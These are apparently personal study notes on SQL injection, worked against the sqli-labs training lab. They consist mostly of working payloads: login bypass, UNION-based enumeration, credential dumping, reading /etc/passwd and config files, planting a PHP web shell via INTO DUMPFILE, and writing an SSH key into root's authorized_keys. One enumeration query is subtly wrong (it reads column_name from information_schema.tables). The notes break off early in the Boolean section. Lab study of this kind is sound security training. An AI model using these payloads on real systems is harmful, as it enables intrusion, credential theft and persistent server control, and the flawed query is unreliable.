
#  SQL INJECTION
lab: https://github.com/Audi-1/sqli-labs

- <font color="#ffc000">Nature:</font> Change input -> change backend SQL statement -> control the database.## Classification of SQL Injection
- In-band: 
## SQL Injection Techniques

### Returning All Records

```sql
SELECT * FROM users WHERE username = '$var'
-- $var represents the user-supplied input.
-- Payload: 'OR 1 = 1 --
SELECT * FROM users WHERE username = '' OR 1 = 1 --'
```

> [!note] Tip
> While SQL Injection can occur in various parts of a query, it is most frequently found in the <font color="#ffc000">WHERE </font>clause.

---
### SQLi Data Extraction Using UNION-Based Technique
- It involves combining two SELECT statements
- 
> [!note] conditions
> 1. Both SELECT statements must return the same number of columns. This means it’s essential to enumerate the total number of columns in the database to ensure that the SELECT statements are aligned correctly.
> 2. The data types defining the columns in both SELECT statements should always be the same. This ensures that the data from different queries can be combined seamlessly by the UNION operation.


- <font color="#ffc000">Determining the Number of Columns: </font>
	- ORDER BY
	- UNION SELECT
	- 
```bash

# order by 3 , 5
http://172.10.10.134:8080/Less-2/?id=1 order by 3

# UNION SELECT NULL,NULL,NULL
http://172.10.10.134:8080/Less-2/?id=1+UNION+SELECT+NULL,NULL,NULL

--> The data is displayed correctly -> there are 3 columns.
```

- <font color="#ffc000">Determining the Vulnerable Columns: </font>
	- -1 UNION SELECT 1,2,3--
	- AND 1=0 UNION SELECT 1,2,3--
	- 
```bash

http://172.10.10.134:8080/Less-2/?id=-1 UNION SELECT 1,2,3--

http://172.10.10.134:8080/Less-2/?id=AND 1=0 UNION SELECT 1,2,3--

--> username = 2
--> pass = 3

```

- <font color="#ffc000">Fingerprinting the Database:</font> database name, version...
	- functions like version(), user(), and database()
- 
```bash

-1 UNION SELECT 1,version(),database()

# --> Your Login name:8.0.45 <-> version
# --> Your Password:security <-> database

```

- <font color="#ffc000">Enumerating: </font>

```bash

## Using Less-2
### Enumerating databases
.../?id=-1 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata LIMIT 0,1 --

.../?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --

# ---> Your Login name:mysql,information_schema,performance_schema,sys,security,challenges

### Enumerating tables from the database: we will query the table_name columns from information_schema.tables
.../?id=-1+union+select+null,group_concat(table_name ),null+from+information_schema.tables+where+table_schema='security'--

# we will use “GROUP_CONCAT” to concatenate multiple values into a single row
# --> Your Login name:emails,referers,uagents,users

### Extracting Columns from Tables
.../?id=-1 union select 1,group_concat(column_name),3 from information_schema.tables where table_name='users' and table_schema='security'--
# --> Your Login name:id,password,username

### Dump data
.../?id=-1+union+select+null,group_concat(username,0x3a,password),null+from+users--
# 0x3a or ':'
```

## SQLi to RCE Pivot

- we can utilize information_schema.schema_privileges table to retrieve information about privileges.

```sql
-- Payloads
-- Obtain permissions on each database (schema)
UNION SELECT 1,group_concat(privilege_type),3 FROM information_schema.schema_privileges-- -
--- > ON database_name.*

-- Take global rights (toàn server)
UNION SELECT 1,group_concat(privilege_type),3 FROM information_schema.USER_PRIVILEGES-- -
--- > ON *.*   (all database)
--- > FILE: Users with the FILE privilege in MySQL can utilize functions such as “LOAD_FILE()” and “LOAD DATA INFILE” to retrieve data.

-- Check by user
SELECT * FROM information_schema.USER_PRIVILEGES WHERE GRANTEE LIKE "%root%";

-- check path
UNION SELECT 1,@@secure_file_priv,3-- -
-- mismatch: CAST(@@secure_file_priv AS CHAR) OR CONVERT(@@secure_file_priv USING gbk)

-- Enumerate path web root
-1 UNION SELECT 1,@@datadir,3-- -
-1 UNION SELECT 1,@@basedir,3-- -

-- Dump the configuration to get the credits.
-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -

-- -- write shell
-- hex
-1 UNION SELECT 
'',
0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,
''
INTO DUMPFILE '/var/lib/mysql-files/shell.php'-- -

---
UNION SELECT '',
"<?php system($_GET['cmd']); ?>",
'' INTO DUMPFILE '/var/lib/mysql-files/shell.php'-- -

-- verify
UNION SELECT 1,LOAD_FILE('/var/lib/mysql-files/shell.php'),3-- -

-- Write SSH key
SELECT "ssh-rsa AAAAB3NzaC1..." 
INTO OUTFILE '/root/.ssh/authorized_keys'

-- Check OS user for MySQL
UNION SELECT 1,USER(),3-- -
UNION SELECT 1,@@hostname,3-- -

```

---
### Boolean SQL Injection
- the server does not return any errors when traditional SQLi payloads are injected, hence we make inference on the basis of submitting true and false statements
- 